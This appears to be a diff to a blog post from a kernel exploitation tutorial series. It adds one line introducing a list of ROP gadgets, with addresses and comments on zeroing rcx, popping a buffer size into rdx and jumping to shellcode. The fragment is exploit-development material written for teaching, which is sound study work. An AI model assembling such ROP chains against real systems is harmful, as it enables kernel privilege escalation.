@@ -38,6 +38,7 @@ jmp rcx; -&gt; jumps to a register which stores the address of our shellcode in 
 <p><img src="/posts/kernel2-img/15-ropper.jpg" alt=""></p>
 <p>And now&hellip;</p>
 <p><img src="/posts/kernel2-img/17-spongebob.jpg" alt=""></p>
+<p>This is what we have got:</p>
 <pre><code>0x38cf53: xor ecx, ecx; mov rax, rcx; ret; -&gt; Zeroes out rcx register. Also zeroes out rax, but that is ok. Couldn't find a gadget that just turned rcx into 0.
 0x416748: pop rdx; ret; -&gt; pops 0x1000 (4096), just like we planned
 0x1000 -&gt; value of rdx and size of the buffer
